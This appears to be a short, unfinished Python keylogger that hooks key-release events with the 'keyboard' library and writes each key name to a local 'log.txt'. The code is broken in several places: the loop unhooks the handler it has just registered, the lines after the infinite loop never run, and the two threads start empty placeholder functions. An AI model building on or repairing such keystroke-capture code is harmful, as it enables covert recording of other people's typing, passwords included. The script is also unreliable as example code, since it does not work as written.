print("starting")
import keyboard
from threading import Thread

file = open("log.txt", "w")
keyboard.unhook_all()


def on_key(key):
    file.write(str(key.name) + "\n")
    file.flush()

while True:
    keyboard.on_release(on_key)
    keyboard.unhook_all()

file.close()

def catch_keys():
    pass

def save_keys():
    pass


t1 = Thread(target=catch_keys)
t2 = Thread(target=save_keys)
t1.start()
t2.start()
